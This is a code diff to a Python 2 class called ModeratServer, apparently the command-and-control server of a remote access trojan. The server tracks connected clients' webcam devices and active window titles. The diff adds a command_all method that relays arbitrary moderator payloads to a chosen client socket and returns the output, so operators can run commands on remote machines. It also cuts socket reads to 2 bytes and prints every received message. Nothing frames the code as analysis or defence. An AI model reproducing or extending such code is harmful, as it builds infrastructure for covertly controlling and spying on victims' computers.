@@ -169,14 +169,15 @@ class ModeratServer:
 
     def Receive(self, sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
         received_data = ""
-        l = sock.recv(1024)
+        l = sock.recv(2)
         while l:
             received_data = received_data + l
             if received_data.endswith(end):
                 break
             else:
-                l = sock.recv(1024)
+                l = sock.recv(2)
         if received_data.count(splitter):
+            print received_data
             _type, message = received_data.split(splitter)
             return _type, message[:-len(end)].decode('utf-8')
         else:
@@ -191,13 +192,12 @@ class ModeratServer:
     def moderator_listener(self, sock, socket_id):
         while 1:
             try:
-                data, mode = self.Receive(sock)
+                client_socket, data = self.Receive(sock)
                 if data == 'getClients':
-                    print 'send Get Clients'
                     output = self.command_get_clients()
                 else:
-                    output = 'No Output'
-                self.Send(sock, output, mode)
+                    output = self.command_all(data, client_socket)
+                self.Send(sock, output, client_socket)
             except socket.error:
                 print 'Socket Error'
                 return
@@ -219,6 +219,9 @@ class ModeratServer:
             self.shared_socks[i]['webcamdevice'] = self.socks[i]['webcamdevice']
             self.shared_socks[i]['activewindowtitle'] = self.streaming_socks[i]['activewindowtitle']
         return str(self.shared_socks)
+
+    def command_all(self, payload, client_socket):
+        return get(self.socks[int(client_socket)]['sock'], payload, client_socket)
 
 
 
